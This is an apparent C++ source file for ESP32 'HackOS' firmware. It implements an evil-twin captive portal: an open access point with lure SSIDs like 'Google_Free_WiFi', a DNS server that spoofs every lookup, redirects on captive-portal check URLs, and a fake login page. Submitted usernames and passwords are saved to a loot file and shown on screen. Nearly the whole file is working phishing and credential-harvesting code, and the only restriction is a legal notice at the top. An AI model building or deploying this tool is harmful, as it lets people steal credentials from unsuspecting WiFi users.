/**
 * @file captive_portal_app.cpp
 * @brief Captive Portal (Evil Twin) App – fake AP with DNS spoofing,
 *        web-based phishing, and credential harvesting.
 *
 * Implements:
 *  - **SoftAP**: opens an unencrypted WiFi access point.
 *  - **DNS Interceptor**: UDP server on port 53 that resolves every query
 *    to the ESP32's AP IP (192.168.4.1).
 *  - **HTTP Server**: serves a phishing page loaded from the SD card
 *    (`/ext/portals/<template>/index.html`) and captures POST credentials.
 *  - **Credential Storage**: appends harvested user/pass pairs to
 *    `/ext/captures/loot.txt` via VFS and publishes EVT_CREDENTIALS
 *    on the FreeRTOS MessageBus.
 *  - **UI**: live view of connected client MACs and captured credentials
 *    on the 128x64 OLED.
 *
 * Uses the HackOSApp lifecycle so all work runs cooperatively inside the
 * Core_Task loop (on_update) without blocking.
 *
 * @warning **Legal notice**: Operating a rogue access point against
 * networks or users you do not own or have explicit written authorisation
 * to test is illegal in most jurisdictions.  Use exclusively in
 * authorised penetration-testing engagements.
 */

#include "apps/captive_portal_app.h"

#include <cstdio>
#include <cstring>
#include <new>

#include <WiFi.h>
#include <WiFiUdp.h>
#include <esp_log.h>
#include <esp_wifi.h>
#include <esp_http_server.h>

#include "apps/hackos_app.h"
#include "core/event.h"
#include "core/event_system.h"
#include "core/message_bus.h"
#include "hardware/display.h"
#include "hardware/input.h"
#include "storage/vfs.h"
#include "ui/widgets.h"

static constexpr const char *TAG_CP = "CaptivePortal";

namespace
{

// ── Tunables ──────────────────────────────────────────────────────────────────

/// AP gateway IP used in DNS responses (192.168.4.1).
static constexpr uint8_t AP_GW_IP[4] = {192U, 168U, 4U, 1U};

static constexpr size_t MAX_CONNECTED_CLIENTS = 8U;
static constexpr size_t MAX_CAPTURED_CREDS    = 16U;
static constexpr size_t FIELD_MAX_LEN         = 64U;
static constexpr size_t HTML_BUF_MAX          = 4096U;
static constexpr size_t DNS_BUF_SIZE          = 512U;
static constexpr uint16_t DNS_PORT            = 53U;
static constexpr size_t POST_BUF_MAX          = 256U;
static constexpr uint8_t AP_CHANNEL           = 6U;
static constexpr uint8_t AP_MAX_CONN          = 4U;
static constexpr size_t HTTPD_MAX_URI         = 8U;
static constexpr size_t HTTPD_STACK_SIZE      = 8192U;

// ── Template descriptors ──────────────────────────────────────────────────────

struct TemplateInfo
{
    const char *label;   ///< Menu display name
    const char *folder;  ///< Subfolder under /ext/portals/
    const char *apSsid;  ///< SSID for the access point
};

static constexpr size_t TEMPLATE_COUNT = 3U;
static const TemplateInfo TEMPLATES[TEMPLATE_COUNT] = {
    {"Router Update", "router",   "RouterUpdate"},
    {"Google Login",  "google",   "Google_Free_WiFi"},
    {"Free WiFi",     "freewifi", "Free_WiFi"},
};

// ── Menu labels ───────────────────────────────────────────────────────────────

static constexpr size_t MAIN_MENU_COUNT = 5U;
static const char *const MAIN_MENU_LABELS[MAIN_MENU_COUNT] = {
    "Router Update",
    "Google Login",
    "Free WiFi",
    "View Loot",
    "Back",
};

// ── Fallback HTML template ────────────────────────────────────────────────────
/// Used when the SD card template is missing.

static const char FALLBACK_HTML[] =
    "<!DOCTYPE html><html><head>"
    "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
    "<title>Login</title>"
    "<style>"
    "body{font-family:sans-serif;display:flex;justify-content:center;"
    "align-items:center;min-height:100vh;margin:0;background:#f0f0f0}"
    ".box{background:#fff;padding:2em;border-radius:8px;"
    "box-shadow:0 2px 10px rgba(0,0,0,.1);width:300px;max-width:90%}"
    "input{width:100%;padding:8px;margin:8px 0;box-sizing:border-box;"
    "border:1px solid #ddd;border-radius:4px}"
    "button{width:100%;padding:10px;background:#4285f4;color:#fff;"
    "border:none;border-radius:4px;cursor:pointer;font-size:16px}"
    "</style></head><body>"
    "<div class=\"box\"><h2>Login Required</h2>"
    "<form method=\"POST\" action=\"/login\">"
    "<input name=\"user\" placeholder=\"Username\" required>"
    "<input name=\"pass\" type=\"password\" placeholder=\"Password\" required>"
    "<button type=\"submit\">Sign In</button>"
    "</form></div></body></html>";

static const char POST_SUCCESS_HTML[] =
    "<!DOCTYPE html><html><head>"
    "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
    "<title>Success</title>"
    "<style>body{font-family:sans-serif;display:flex;justify-content:center;"
    "align-items:center;min-height:100vh;margin:0;background:#f0f0f0}"
    ".box{background:#fff;padding:2em;border-radius:8px;text-align:center;"
    "box-shadow:0 2px 10px rgba(0,0,0,.1);width:300px}</style></head><body>"
    "<div class=\"box\"><h2>Connected!</h2>"
    "<p>Please wait while we verify your credentials...</p>"
    "</div></body></html>";

// ── State machine ─────────────────────────────────────────────────────────────

enum class PortalState : uint8_t
{
    MENU_MAIN,
    PORTAL_RUNNING,
    LOG_VIEW,
};

// ── Captured credential entry ─────────────────────────────────────────────────

struct Credential
{
    char user[FIELD_MAX_LEN];
    char pass[FIELD_MAX_LEN];
};

// ── Connected client entry ────────────────────────────────────────────────────

struct ClientEntry
{
    uint8_t mac[6];
};

// ── DNS helpers ───────────────────────────────────────────────────────────────

/**
 * @brief Build a DNS A-record response pointing to the AP gateway IP.
 *
 * The response copies the original query header and question, then
 * appends a single A-record answer with a 60-second TTL.
 *
 * @param query     Raw DNS query bytes.
 * @param queryLen  Length of the query in bytes.
 * @param resp      Output buffer (must be >= queryLen + 16).
 * @return Number of bytes written to @p resp, or 0 on error.
 */
static int buildDnsResponse(const uint8_t *query, int queryLen, uint8_t *resp)
{
    if (queryLen < 12)
    {
        return 0;
    }

    std::memcpy(resp, query, static_cast<size_t>(queryLen));

    // Response flags: QR=1, AA=1
    resp[2] = 0x84U;
    resp[3] = 0x00U;
    // ANCOUNT = 1
    resp[6] = 0x00U;
    resp[7] = 0x01U;

    int pos = queryLen;
    // NAME: pointer to question name at offset 12
    resp[pos++] = 0xC0U;
    resp[pos++] = 0x0CU;
    // TYPE A
    resp[pos++] = 0x00U;
    resp[pos++] = 0x01U;
    // CLASS IN
    resp[pos++] = 0x00U;
    resp[pos++] = 0x01U;
    // TTL = 60 s
    resp[pos++] = 0x00U;
    resp[pos++] = 0x00U;
    resp[pos++] = 0x00U;
    resp[pos++] = 0x3CU;
    // RDLENGTH = 4
    resp[pos++] = 0x00U;
    resp[pos++] = 0x04U;
    // RDATA = 192.168.4.1
    resp[pos++] = AP_GW_IP[0];
    resp[pos++] = AP_GW_IP[1];
    resp[pos++] = AP_GW_IP[2];
    resp[pos++] = AP_GW_IP[3];

    return pos;
}

// ── URL-decode helper ─────────────────────────────────────────────────────────

static char hexVal(char c)
{
    if (c >= '0' && c <= '9') return static_cast<char>(c - '0');
    if (c >= 'A' && c <= 'F') return static_cast<char>(c - 'A' + 10);
    if (c >= 'a' && c <= 'f') return static_cast<char>(c - 'a' + 10);
    return 0;
}

/**
 * @brief URL-decode a string.
 *
 * Converts `%XX` sequences and `+` signs.  The result is always
 * NUL-terminated and no longer than the original.
 */
static void urlDecode(char *dst, const char *src, size_t maxLen)
{
    size_t di = 0U;
    for (size_t si = 0U; src[si] != '\0' && di < maxLen - 1U; ++si)
    {
        if (src[si] == '%' && src[si + 1U] != '\0' && src[si + 2U] != '\0')
        {
            dst[di++] = static_cast<char>((hexVal(src[si + 1U]) << 4U) |
                                           hexVal(src[si + 2U]));
            si += 2U;
        }
        else if (src[si] == '+')
        {
            dst[di++] = ' ';
        }
        else
        {
            dst[di++] = src[si];
        }
    }
    dst[di] = '\0';
}

/**
 * @brief Extract a named field value from URL-encoded POST body.
 *
 * Searches for `name=value` in @p body, where values are separated by `&`.
 * The extracted value is URL-decoded into @p out.
 *
 * @return true if the field was found and extracted.
 */
static bool extractField(const char *body, const char *name,
                          char *out, size_t outLen)
{
    const size_t nameLen = std::strlen(name);
    const char *p = body;

    while ((p = std::strstr(p, name)) != nullptr)
    {
        // Ensure it's a whole-word match (start of string or preceded by '&')
        if (p != body && *(p - 1) != '&')
        {
            ++p;
            continue;
        }

        if (p[nameLen] == '=')
        {
            const char *valStart = p + nameLen + 1U;
            const char *valEnd = std::strchr(valStart, '&');
            size_t valLen = (valEnd != nullptr)
                                ? static_cast<size_t>(valEnd - valStart)
                                : std::strlen(valStart);

            if (valLen >= outLen)
            {
                valLen = outLen - 1U;
            }

            // Temporary NUL-terminated copy for URL-decode
            char tmp[POST_BUF_MAX];
            if (valLen >= sizeof(tmp))
            {
                valLen = sizeof(tmp) - 1U;
            }
            std::memcpy(tmp, valStart, valLen);
            tmp[valLen] = '\0';

            urlDecode(out, tmp, outLen);
            return true;
        }
        ++p;
    }

    out[0] = '\0';
    return false;
}

// ── Forward declarations for HTTP handlers ───────────────────────────────────

static esp_err_t httpLoginGetHandler(httpd_req_t *req);
static esp_err_t httpLoginPostHandler(httpd_req_t *req);
static esp_err_t httpCaptiveRedirectHandler(httpd_req_t *req);

// ── App class ─────────────────────────────────────────────────────────────────

class CaptivePortalApp final : public hackos::HackOSApp
{
public:
    CaptivePortalApp()
        : statusBar_(0, 0, 128, 8),
          mainMenu_(0, 20, 128, 36, 3),
          state_(PortalState::MENU_MAIN),
          needsRedraw_(true),
          templateIndex_(0U),
          httpServer_(nullptr),
          dnsUdp_(),
          clientCount_(0U),
          credCount_(0U),
          logScroll_(0U),
          portalActive_(false)
    {
        std::memset(clients_, 0, sizeof(clients_));
        std::memset(creds_, 0, sizeof(creds_));
    }

    /// @brief Returns the current template index (used by HTTP handler).
    size_t getTemplateIndex() const { return templateIndex_; }

    /// @brief Called from the HTTP POST handler to store a credential.
    void addCredential(const char *user, const char *pass)
    {
        if (credCount_ < MAX_CAPTURED_CREDS)
        {
            std::strncpy(creds_[credCount_].user, user, FIELD_MAX_LEN - 1U);
            creds_[credCount_].user[FIELD_MAX_LEN - 1U] = '\0';
            std::strncpy(creds_[credCount_].pass, pass, FIELD_MAX_LEN - 1U);
            creds_[credCount_].pass[FIELD_MAX_LEN - 1U] = '\0';
            ++credCount_;
        }

        // Write to loot file on SD
        saveLoot(user, pass);

        // Publish event to MessageBus
        hackos::core::HackOSEvent evt{};
        evt.type = static_cast<uint8_t>(hackos::core::HackOSEventType::EVT_CREDENTIALS);
        evt.arg0 = static_cast<int32_t>(credCount_);
        evt.arg1 = 0;
        evt.payload = nullptr;
        (void)hackos::core::MessageBus::instance().publish(evt);

        needsRedraw_ = true;
    }

protected:
    // ── HackOSApp lifecycle ──────────────────────────────────────────────

    void on_alloc() override
    {
        // No AppContext allocs needed; we use member storage.
    }

    void on_start() override
    {
        statusBar_.setConnectivity(false, false);
        statusBar_.setBatteryLevel(100U);
        statusBar_.setTime(0U, 0U);
        mainMenu_.setItems(MAIN_MENU_LABELS, MAIN_MENU_COUNT);

        templateIndex_ = 0U;
        state_ = PortalState::MENU_MAIN;
        needsRedraw_ = true;
        ESP_LOGI(TAG_CP, "Captive Portal app started");
    }

    void on_event(Event *event) override
    {
        if (event == nullptr || event->type != EventType::EVT_INPUT)
        {
            return;
        }

        const auto input = static_cast<InputManager::InputEvent>(event->arg0);
        handleInput(input);
    }

    void on_update() override
    {
        if (state_ == PortalState::PORTAL_RUNNING)
        {
            pollDns();
            refreshClientList();
            needsRedraw_ = true;
        }
    }

    void on_draw() override
    {
        if (!needsRedraw_ && !anyWidgetDirty())
        {
            return;
        }

        DisplayManager::instance().clear();
        statusBar_.draw();

        switch (state_)
        {
        case PortalState::MENU_MAIN:
            drawTitle("Captive Portal");
            mainMenu_.draw();
            break;
        case PortalState::PORTAL_RUNNING:
            drawPortalStatus();
            break;
        case PortalState::LOG_VIEW:
            drawLogView();
            break;
        }

        DisplayManager::instance().present();
        clearAllDirty();
        needsRedraw_ = false;
    }

    void on_free() override
    {
        stopPortal();
        ESP_LOGI(TAG_CP, "Captive Portal app freed");
    }

private:
    StatusBar    statusBar_;
    MenuListView mainMenu_;

    PortalState state_;
    bool        needsRedraw_;
    size_t      templateIndex_;

    // HTTP server
    httpd_handle_t httpServer_;

    // DNS via WiFiUDP
    WiFiUDP dnsUdp_;

    // Connected clients
    ClientEntry clients_[MAX_CONNECTED_CLIENTS];
    size_t      clientCount_;

    // Captured credentials
    Credential creds_[MAX_CAPTURED_CREDS];
    size_t     credCount_;

    // Log scroll position
    size_t logScroll_;

    bool portalActive_;

    // ── Dirty/redraw helpers ─────────────────────────────────────────────

    bool anyWidgetDirty() const
    {
        return statusBar_.isDirty() || mainMenu_.isDirty();
    }

    void clearAllDirty()
    {
        statusBar_.clearDirty();
        mainMenu_.clearDirty();
    }

    void transitionTo(PortalState next)
    {
        state_ = next;
        needsRedraw_ = true;
    }

    // ── Drawing helpers ──────────────────────────────────────────────────

    void drawTitle(const char *title)
    {
        DisplayManager::instance().drawText(2, 10, title);
        DisplayManager::instance().drawLine(0, 18, 127, 18);
    }

    void drawPortalStatus()
    {
        drawTitle("Portal Active");

        char buf[32];
        if (templateIndex_ < TEMPLATE_COUNT)
        {
            std::snprintf(buf, sizeof(buf), "AP: %.20s",
                          TEMPLATES[templateIndex_].apSsid);
        }
        else
        {
            std::snprintf(buf, sizeof(buf), "AP: Evil_Portal");
        }
        DisplayManager::instance().drawText(2, 22, buf);

        std::snprintf(buf, sizeof(buf), "Clients: %u",
                      static_cast<unsigned>(clientCount_));
        DisplayManager::instance().drawText(2, 32, buf);

        std::snprintf(buf, sizeof(buf), "Creds: %u",
                      static_cast<unsigned>(credCount_));
        DisplayManager::instance().drawText(2, 42, buf);

        if (credCount_ > 0U)
        {
            std::snprintf(buf, sizeof(buf), "Last: %.18s",
                          creds_[credCount_ - 1U].user);
            DisplayManager::instance().drawText(2, 52, buf);
        }
        else
        {
            DisplayManager::instance().drawText(2, 54, "Waiting...");
        }

        DisplayManager::instance().drawText(80, 54, "[STOP]");
    }

    void drawLogView()
    {
        drawTitle("Captured Loot");

        if (credCount_ == 0U)
        {
            DisplayManager::instance().drawText(4, 28, "No credentials yet");
            DisplayManager::instance().drawText(4, 42, "Press to go back");
            return;
        }

        // Show up to 4 entries starting from logScroll_
        static constexpr size_t VISIBLE_ROWS = 4U;
        static constexpr uint8_t ROW_HEIGHT  = 10U;

        for (size_t i = 0U; i < VISIBLE_ROWS; ++i)
        {
            const size_t idx = logScroll_ + i;
            if (idx >= credCount_)
            {
                break;
            }

            char buf[32];
            std::snprintf(buf, sizeof(buf), "%u:%.9s/%.9s",
                          static_cast<unsigned>(idx + 1U),
                          creds_[idx].user,
                          creds_[idx].pass);
            DisplayManager::instance().drawText(2,
                static_cast<int16_t>(22 + i * ROW_HEIGHT), buf);
        }

        DisplayManager::instance().drawText(2, 56, "UP/DN scroll  BTN back");
    }

    // ── Input handling ───────────────────────────────────────────────────

    void handleInput(InputManager::InputEvent input)
    {
        switch (state_)
        {
        case PortalState::MENU_MAIN:
            handleMainInput(input);
            break;
        case PortalState::PORTAL_RUNNING:
            if (input == InputManager::InputEvent::BUTTON_PRESS)
            {
                stopPortal();
                transitionTo(PortalState::MENU_MAIN);
            }
            break;
        case PortalState::LOG_VIEW:
            handleLogInput(input);
            break;
        }
    }

    void handleMainInput(InputManager::InputEvent input)
    {
        if (input == InputManager::InputEvent::UP)
        {
            mainMenu_.moveSelection(-1);
        }
        else if (input == InputManager::InputEvent::DOWN)
        {
            mainMenu_.moveSelection(1);
        }
        else if (input == InputManager::InputEvent::BUTTON_PRESS)
        {
            const size_t sel = mainMenu_.selectedIndex();

            if (sel < TEMPLATE_COUNT)
            {
                templateIndex_ = sel;
                startPortal();
            }
            else if (sel == 3U)
            {
                // View Loot
                logScroll_ = 0U;
                transitionTo(PortalState::LOG_VIEW);
            }
            else
            {
                // Back
                const Event evt{EventType::EVT_SYSTEM, SYSTEM_EVENT_BACK,
                                0, nullptr};
                EventSystem::instance().postEvent(evt);
            }
        }
    }

    void handleLogInput(InputManager::InputEvent input)
    {
        if (input == InputManager::InputEvent::UP && logScroll_ > 0U)
        {
            --logScroll_;
            needsRedraw_ = true;
        }
        else if (input == InputManager::InputEvent::DOWN &&
                 logScroll_ + 4U < credCount_)
        {
            ++logScroll_;
            needsRedraw_ = true;
        }
        else if (input == InputManager::InputEvent::BUTTON_PRESS ||
                 input == InputManager::InputEvent::LEFT)
        {
            transitionTo(PortalState::MENU_MAIN);
        }
    }

    // ── Portal lifecycle ─────────────────────────────────────────────────

    void startPortal()
    {
        if (portalActive_)
        {
            return;
        }

        credCount_   = 0U;
        clientCount_ = 0U;
        logScroll_   = 0U;

        if (!startSoftAP())
        {
            ESP_LOGE(TAG_CP, "Failed to start SoftAP");
            return;
        }

        if (!startDnsServer())
        {
            ESP_LOGE(TAG_CP, "Failed to start DNS server");
            stopSoftAP();
            return;
        }

        if (!startHttpServer())
        {
            ESP_LOGE(TAG_CP, "Failed to start HTTP server");
            stopDnsServer();
            stopSoftAP();
            return;
        }

        portalActive_ = true;
        statusBar_.setConnectivity(false, true);
        transitionTo(PortalState::PORTAL_RUNNING);
        ESP_LOGI(TAG_CP, "Portal started with template '%s'",
                 (templateIndex_ < TEMPLATE_COUNT)
                     ? TEMPLATES[templateIndex_].label
                     : "fallback");
    }

    void stopPortal()
    {
        if (!portalActive_)
        {
            return;
        }

        stopHttpServer();
        stopDnsServer();
        stopSoftAP();

        portalActive_ = false;
        statusBar_.setConnectivity(false, false);
        ESP_LOGI(TAG_CP, "Portal stopped");
    }

    // ── SoftAP control ───────────────────────────────────────────────────

    bool startSoftAP()
    {
        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
        esp_err_t err = esp_wifi_init(&cfg);
        if (err != ESP_OK)
        {
            ESP_LOGW(TAG_CP, "esp_wifi_init: %d (may be already init)", err);
        }

        err = esp_wifi_set_mode(WIFI_MODE_AP);
        if (err != ESP_OK)
        {
            ESP_LOGE(TAG_CP, "set_mode AP failed: %d", err);
            return false;
        }

        wifi_config_t apCfg = {};
        const char *ssid = (templateIndex_ < TEMPLATE_COUNT)
                               ? TEMPLATES[templateIndex_].apSsid
                               : "Evil_Portal";
        std::strncpy(reinterpret_cast<char *>(apCfg.ap.ssid), ssid, 32U);
        apCfg.ap.ssid_len = static_cast<uint8_t>(std::strlen(ssid));
        apCfg.ap.channel = AP_CHANNEL;
        apCfg.ap.authmode = WIFI_AUTH_OPEN;
        apCfg.ap.max_connection = AP_MAX_CONN;
        apCfg.ap.beacon_interval = 100U;

        err = esp_wifi_set_config(WIFI_IF_AP, &apCfg);
        if (err != ESP_OK)
        {
            ESP_LOGE(TAG_CP, "set_config AP failed: %d", err);
            return false;
        }

        err = esp_wifi_start();
        if (err != ESP_OK)
        {
            ESP_LOGE(TAG_CP, "wifi_start failed: %d", err);
            return false;
        }

        ESP_LOGI(TAG_CP, "SoftAP started: SSID='%s' ch=%u", ssid,
                 static_cast<unsigned>(AP_CHANNEL));
        return true;
    }

    void stopSoftAP()
    {
        esp_wifi_stop();
        esp_wifi_deinit();
        ESP_LOGI(TAG_CP, "SoftAP stopped");
    }

    // ── DNS server (via WiFiUDP) ─────────────────────────────────────────

    bool startDnsServer()
    {
        if (!dnsUdp_.begin(DNS_PORT))
        {
            ESP_LOGE(TAG_CP, "DNS UDP begin failed");
            return false;
        }
        ESP_LOGI(TAG_CP, "DNS server started on port %u", DNS_PORT);
        return true;
    }

    void stopDnsServer()
    {
        dnsUdp_.stop();
        ESP_LOGI(TAG_CP, "DNS server stopped");
    }

    /// @brief Non-blocking DNS poll – called from on_update().
    void pollDns()
    {
        const int packetSize = dnsUdp_.parsePacket();
        if (packetSize <= 0)
        {
            return;
        }

        uint8_t queryBuf[DNS_BUF_SIZE];
        uint8_t respBuf[DNS_BUF_SIZE];
        const int bytesRead = dnsUdp_.read(queryBuf, sizeof(queryBuf));
        if (bytesRead <= 0)
        {
            return;
        }

        const int respLen = buildDnsResponse(queryBuf, bytesRead, respBuf);
        if (respLen > 0)
        {
            dnsUdp_.beginPacket(dnsUdp_.remoteIP(), dnsUdp_.remotePort());
            dnsUdp_.write(respBuf, static_cast<size_t>(respLen));
            dnsUdp_.endPacket();
        }
    }

    // ── HTTP server ──────────────────────────────────────────────────────

    bool startHttpServer()
    {
        httpd_config_t config = HTTPD_DEFAULT_CONFIG();
        config.max_uri_handlers = HTTPD_MAX_URI;
        config.stack_size = HTTPD_STACK_SIZE;
        config.lru_purge_enable = true;

        esp_err_t err = httpd_start(&httpServer_, &config);
        if (err != ESP_OK)
        {
            ESP_LOGE(TAG_CP, "httpd_start failed: %d", err);
            httpServer_ = nullptr;
            return false;
        }

        // /login GET – serve phishing page
        const httpd_uri_t loginGet = {
            "/login", HTTP_GET, httpLoginGetHandler, nullptr
#ifdef CONFIG_HTTPD_WS_SUPPORT
            , false, false, nullptr
#endif
        };
        (void)httpd_register_uri_handler(httpServer_, &loginGet);

        // /login POST – capture credentials
        const httpd_uri_t loginPost = {
            "/login", HTTP_POST, httpLoginPostHandler, nullptr
#ifdef CONFIG_HTTPD_WS_SUPPORT
            , false, false, nullptr
#endif
        };
        (void)httpd_register_uri_handler(httpServer_, &loginPost);

        // Captive portal detection endpoints – redirect to /login
        const httpd_uri_t generate204 = {
            "/generate_204", HTTP_GET, httpCaptiveRedirectHandler, nullptr
#ifdef CONFIG_HTTPD_WS_SUPPORT
            , false, false, nullptr
#endif
        };
        (void)httpd_register_uri_handler(httpServer_, &generate204);

        const httpd_uri_t gen204 = {
            "/gen_204", HTTP_GET, httpCaptiveRedirectHandler, nullptr
#ifdef CONFIG_HTTPD_WS_SUPPORT
            , false, false, nullptr
#endif
        };
        (void)httpd_register_uri_handler(httpServer_, &gen204);

        const httpd_uri_t hotspot = {
            "/hotspot-detect.html", HTTP_GET, httpCaptiveRedirectHandler, nullptr
#ifdef CONFIG_HTTPD_WS_SUPPORT
            , false, false, nullptr
#endif
        };
        (void)httpd_register_uri_handler(httpServer_, &hotspot);

        const httpd_uri_t connecttest = {
            "/connecttest.txt", HTTP_GET, httpCaptiveRedirectHandler, nullptr
#ifdef CONFIG_HTTPD_WS_SUPPORT
            , false, false, nullptr
#endif
        };
        (void)httpd_register_uri_handler(httpServer_, &connecttest);

        // Wildcard – catch everything else and redirect
        const httpd_uri_t wildcard = {
            "/*", HTTP_GET, httpCaptiveRedirectHandler, nullptr
#ifdef CONFIG_HTTPD_WS_SUPPORT
            , false, false, nullptr
#endif
        };
        (void)httpd_register_uri_handler(httpServer_, &wildcard);

        ESP_LOGI(TAG_CP, "HTTP server started");
        return true;
    }

    void stopHttpServer()
    {
        if (httpServer_ != nullptr)
        {
            httpd_stop(httpServer_);
            httpServer_ = nullptr;
            ESP_LOGI(TAG_CP, "HTTP server stopped");
        }
    }

    // ── Connected-client refresh ─────────────────────────────────────────

    void refreshClientList()
    {
        wifi_sta_list_t staList = {};
        if (esp_wifi_ap_get_sta_list(&staList) != ESP_OK)
        {
            return;
        }

        clientCount_ = 0U;
        for (size_t i = 0U; i < static_cast<size_t>(staList.num) &&
                                 clientCount_ < MAX_CONNECTED_CLIENTS; ++i)
        {
            std::memcpy(clients_[clientCount_].mac, staList.sta[i].mac, 6U);
            ++clientCount_;
        }
    }

    // ── Credential persistence ───────────────────────────────────────────

    void saveLoot(const char *user, const char *pass)
    {
        auto &vfs = hackos::storage::VirtualFS::instance();
        fs::File f = vfs.open("/ext/captures/loot.txt", "a");
        if (!f)
        {
            ESP_LOGW(TAG_CP, "Cannot open loot.txt for writing");
            return;
        }

        char line[POST_BUF_MAX];
        const int len = std::snprintf(line, sizeof(line), "user=%s pass=%s\n",
                                      user, pass);
        if (len > 0)
        {
            f.write(reinterpret_cast<const uint8_t *>(line),
                    static_cast<size_t>(len));
        }
        f.close();
        ESP_LOGI(TAG_CP, "Loot saved to SD");
    }
};

// ── Global app pointer (used by HTTP handlers) ───────────────────────────────

static CaptivePortalApp *g_portalApp = nullptr;

// ── HTTP handler implementations ─────────────────────────────────────────────

esp_err_t httpLoginGetHandler(httpd_req_t *req)
{
    if (g_portalApp == nullptr)
    {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "App not ready");
        return ESP_FAIL;
    }

    // Try loading template from SD
    const size_t tplIdx = g_portalApp->getTemplateIndex();
    if (tplIdx < TEMPLATE_COUNT)
    {
        char path[96];
        std::snprintf(path, sizeof(path), "/ext/portals/%s/index.html",
                      TEMPLATES[tplIdx].folder);

        auto &vfs = hackos::storage::VirtualFS::instance();
        fs::File f = vfs.open(path, "r");
        if (f)
        {
            const size_t fileSize = f.size();
            const size_t readSize = (fileSize < HTML_BUF_MAX) ? fileSize : HTML_BUF_MAX;

            char *buf = new (std::nothrow) char[readSize + 1U];
            if (buf != nullptr)
            {
                const size_t bytesRead = f.readBytes(buf, readSize);
                buf[bytesRead] = '\0';
                f.close();

                httpd_resp_set_type(req, "text/html");
                httpd_resp_send(req, buf, static_cast<ssize_t>(bytesRead));
                delete[] buf;
                return ESP_OK;
            }
            // Allocation failed – fall through to built-in template
            f.close();
        }
    }

    // Fallback: serve built-in template
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, FALLBACK_HTML,
                    static_cast<ssize_t>(sizeof(FALLBACK_HTML) - 1U));
    return ESP_OK;
}

esp_err_t httpLoginPostHandler(httpd_req_t *req)
{
    char postBuf[POST_BUF_MAX];
    const int contentLen = req->content_len;

    if (contentLen <= 0 || static_cast<size_t>(contentLen) >= sizeof(postBuf))
    {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid body");
        return ESP_FAIL;
    }

    const int received = httpd_req_recv(req, postBuf, static_cast<size_t>(contentLen));
    if (received <= 0)
    {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Receive error");
        return ESP_FAIL;
    }
    postBuf[received] = '\0';

    char user[FIELD_MAX_LEN];
    char pass[FIELD_MAX_LEN];
    (void)extractField(postBuf, "user", user, sizeof(user));
    (void)extractField(postBuf, "pass", pass, sizeof(pass));

    ESP_LOGD(TAG_CP, "Credential captured");

    if (g_portalApp != nullptr)
    {
        g_portalApp->addCredential(user, pass);
    }

    // Respond with success page
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, POST_SUCCESS_HTML,
                    static_cast<ssize_t>(sizeof(POST_SUCCESS_HTML) - 1U));
    return ESP_OK;
}

esp_err_t httpCaptiveRedirectHandler(httpd_req_t *req)
{
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/login");
    httpd_resp_send(req, nullptr, 0);
    return ESP_OK;
}

} // namespace

// ── Factory ──────────────────────────────────────────────────────────────────

AppBase *createCaptivePortalApp()
{
    auto *app = new (std::nothrow) CaptivePortalApp();
    g_portalApp = app;
    return app;
}
